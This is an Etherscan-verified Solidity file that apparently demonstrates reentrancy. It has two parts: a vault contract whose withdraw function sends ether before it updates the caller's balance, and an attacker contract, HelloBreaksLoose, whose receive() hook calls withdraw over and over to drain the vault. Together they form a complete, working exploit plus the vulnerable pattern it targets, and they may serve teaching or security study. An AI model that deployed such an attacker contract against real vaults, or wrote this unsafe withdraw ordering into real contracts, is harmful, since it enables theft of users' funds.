/**
 *Submitted for verification at Etherscan.io on 2022-10-28
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.10;

contract EtherRentrancy {
    
    mapping (address => uint256) public balances;
    address public owner;
    
    constructor() public {
        owner = msg.sender;
    }
    
    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }
    
    
    function withdraw(uint _amount) public {
        require (balances[msg.sender] >= _amount, "Insufficient funds");
        
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send funds");
        
        balances[msg.sender] -= _amount;
    }
    
    function getBalance() public view returns(uint){
        return address(this).balance;
        
    }
    
}


contract HelloBreaksLoose{
    EtherRentrancy etherrentrancy;
    
    constructor(address _etherrentrancy) public {
        etherrentrancy = EtherRentrancy(_etherrentrancy);
    }
    receive() external payable {
        if (etherrentrancy.getBalance() >= 1 ether){
            etherrentrancy.withdraw(1 ether);
            
        }
    }
    function attack() external payable{
        require(msg.value >= 1 ether);
        etherrentrancy.deposit{value: msg.value}();
        etherrentrancy.withdraw(1 ether);
        
        
    }
    function getBalance() public view returns(uint){
        return address(this).balance;
        
    }
}